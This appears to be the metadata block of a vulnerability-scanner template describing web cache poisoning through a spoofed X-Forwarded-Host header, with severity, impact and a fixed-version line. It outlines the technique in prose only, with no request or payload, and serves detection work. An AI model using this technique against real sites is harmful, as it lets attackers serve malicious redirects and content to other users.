  name:  Web Cache Poisoning via Host Header
  author: RosePwns
  severity: high
  description: |
    This web application is using a caching system. By sending a request with a X-Forwarded-Host header, we can overide the Host header and force the caching system to cache a response that contains a redirect to our server. From here, malicious content could be served to clients.
  impact: |
    allows attackers to target and access internal applications that are meant to be hidden by the reverse proxy, potentially leading to unauthorized access, data leakage, or further exploitation.
  remediation: Fixed 2.4.56
